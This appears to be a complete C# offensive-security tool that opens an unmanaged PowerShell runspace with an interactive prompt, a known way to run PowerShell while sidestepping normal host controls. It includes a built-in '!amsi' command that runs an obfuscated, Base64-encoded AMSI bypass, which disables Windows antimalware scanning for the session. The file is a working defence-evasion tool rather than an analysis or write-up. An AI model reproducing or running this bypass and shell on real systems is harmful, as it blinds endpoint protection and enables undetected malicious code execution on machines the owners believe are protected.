using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Threading;

namespace RFC_PowerShellRunSpace
{
    public class Program
    {
        public static void Main(string[] args)
        {
            bool interact = false;

            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                Console.WriteLine("\n\nCtrl+C intercepted. Enter exit to close.");
            };

            ProcessStartInfo startInfo = new ProcessStartInfo();
            {
                startInfo.FileName = "powershell.exe";
                startInfo.RedirectStandardOutput = true;
                startInfo.UseShellExecute = false;
                startInfo.Arguments = "-NoExit -ExecutionPolicy Bypass";
                startInfo.Verb = "runas";
            }

            Runspace runspace = RunspaceFactory.CreateRunspace();
            {
                runspace.Open();
            }

            PowerShell powershell = PowerShell.Create();
            {
                powershell.Runspace = runspace;
            }

            Thread cmd = new Thread(() =>
            {
                interact = true;
                while (interact)
                {
                    Collection<PSObject> results = new Collection<PSObject>();


                    string prompt = "";
                    powershell.Commands.Clear();
                    powershell.Streams.ClearStreams();
                    powershell.AddScript("$hostname = $env:COMPUTERNAME; $cwd = (Invoke-Expression -Command \"&{Get-Location | Select-Object -ExpandProperty Path}\"); \"[$hostname] $cwd> \"");
                    Collection<PSObject> promptResults = powershell.Invoke();
                    foreach (PSObject obj in promptResults)
                    {
                        prompt += obj.ToString();
                    }
                    Console.Write($"\nRFC-Pwsh > {prompt}");
                    string command = Console.ReadLine();

                    try
                    {
                        switch (command)
                        {
                            case "exit":
                                interact = false;
                                break;
                            case "!amsi":
                                string amsi = "$t = [Ref].Assembly.GetTypes() | foreach {if ($_.Name -like \"*iUtils\") {$u=$_}};Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"JABmAHMAIAA9ACAAJAB1AC4ARwBlAHQARgBpAGUAbABkAHMAKAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApACAAfAAgAGYAbwByAGUAYQBjAGgAIAB7AGkAZgAgACgAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACIAKgBJAG4AaQB0AEYAYQBpAGwAZQBkACIAKQAgAHsAJABmAD0AJABfAH0AfQA=\")));$f.SetValue($null,$true)";
                                powershell.Commands.Clear();
                                powershell.Streams.ClearStreams();
                                powershell.AddScript(amsi);
                                results = powershell.Invoke();
                                break;
                            default:
                                powershell.Commands.Clear();
                                powershell.Streams.ClearStreams();
                                powershell.AddScript(command);
                                results = powershell.Invoke();

                                foreach (PSObject obj in results)
                                {
                                    Console.WriteLine(obj.ToString());
                                }

                                foreach (ErrorRecord error in powershell.Streams.Error)
                                {
                                    Console.WriteLine(error.ToString());
                                }

                                break;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
            });
            cmd.Start();
            cmd.Join();

            powershell.Dispose();
            runspace.Dispose();
        }
    }
}
